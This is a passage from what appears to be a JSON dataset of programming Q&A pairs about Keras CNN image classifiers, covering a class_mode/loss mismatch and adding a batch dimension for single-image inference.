…
                    tf.keras.layers.Dense(512, activation='relu'),\n                                    tf.keras.layers.Dense(5),\n                                    \n])\n\nmodel.compile(optimizer='adam',\n              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True),\n              metrics=['accuracy'])\nmodel.summary()\n<\/code><\/pre>\n<p>The batch size is 100 and input dimension is 150,150\nThe summary is as follows:\nModel: &quot;sequential_4&quot;<\/p>\n<hr \/>\n<p>Layer (type)                 Output Shape              Param #<\/p>\n<p>conv2d_12 (Conv2D)           (None, 148, 148, 16)      448<\/p>\n<hr \/>\n<p>max_pooling2d_12 (MaxPooling (None, 74, 74, 16)        0<\/p>\n<hr \/>\n<p>conv2d_13 (Conv2D)           (None, 72, 72, 32)        4640<\/p>\n<hr \/>\n<p>max_pooling2d_13 (MaxPooling (None, 36, 36, 32)        0<\/p>\n<hr \/>\n<p>conv2d_14 (Conv2D)           (None, 34, 34, 64)        18496<\/p>\n<hr \/>\n<p>max_pooling2d_14 (MaxPooling (None, 17, 17, 64)        0<\/p>\n<hr \/>\n<p>dropout_4 (Dropout)          (None, 17, 17, 64)        0<\/p>\n<hr \/>\n<p>flatten_4 (Flatten)          (None, 18496)             0<\/p>\n<hr \/>\n<p>dense_8 (Dense)              (None, 512)               9470464<\/p>\n<hr \/>\n<p>dense_9 (Dense)              (None, 5)                 2565<\/p>\n<p>Total params: 9,496,613\nTrainable params: 9,496,613\nNon-trainable params: 0<\/p>\n<p>Any thoughts on what may be wrong?<\/p>","output_text":"<p>pay attention to class_mode in your generator<\/p>\n<p>'int': means that the labels are encoded as integers (e.g. for sparse_categorical_crossentropy loss). 'categorical' means that the labels are encoded as a categorical vector (e.g. for categorical_crossentropy loss). 'binary' means that the labels (there can be only 2) are encoded as float32 scalars with values 0 or 1 (e.g. for binary_crossentropy). None (no labels).<\/p>\n<p>it seems you need 'int' instead of 'binary' for both train and validation generator<\/p>"}
…
_range=0.2,\n  height_shift_range=0.2,\n  shear_range=0.2,\n  zoom_range=0.2,\n  horizontal_flip=True,\n  fill_mode='nearest')\n\ntrain_generator = training_datagen.flow_from_directory(\n  TRAINING_DIR,\n  target_size=(150,150),\n  class_mode='categorical',\n  batch_size=126)\n<\/code><\/pre>\n<p>Output from summary():<\/p>\n<pre><code> Model: &quot;sequential&quot;\n_________________________________________________________________\nLayer (type)                 Output Shape              Param #   \n=================================================================\nconv2d (Conv2D)              (None, 148, 148, 64)      1792      \n_________________________________________________________________\nmax_pooling2d (MaxPooling2D) (None, 74, 74, 64)        0         \n_________________________________________________________________\nconv2d_1 (Conv2D)            (None, 72, 72, 64)        36928     \n_________________________________________________________________\nmax_pooling2d_1 (MaxPooling2 (None, 36, 36, 64)        0         \n_________________________________________________________________\nconv2d_2 (Conv2D)            (None, 34, 34, 128)       73856     \n_________________________________________________________________\nmax_pooling2d_2 (MaxPooling2 (None, 17, 17, 128)       0         \n_________________________________________________________________\nconv2d_3 (Conv2D)            (None, 15, 15, 128)       147584    \n_________________________________________________________________\nmax_pooling2d_3 (MaxPooling2 (None, 7, 7, 128)         0         \n_________________________________________________________________\nflatten (Flatten)            (None, 6272)              0         \n_________________________________________________________________\ndropout (Dropout)            (None, 6272)              0         \n_________________________________________________________________\ndense (Dense)                (None, 512)               3211776   \n_________________________________________________________________\ndense_1 (Dense)              (None, 3)                 1539      \n=================================================================\nTotal params: 3,473,475\nTrainable params: 3,473,475\nNon-trainable params: 0\n_________________________________________________________________\n<\/code><\/pre>","output_text":"<p>When you want to use your network in inference, you still have to use a batch size. In your case, the batch size is 1.<\/p>\n<p>You can add the batch with the following code:<\/p>\n<pre><code>img = cv2.resize(img, (150,150))    \nimg = tf.expand_dims(img , 0)\n<\/code><\/pre>"}
…
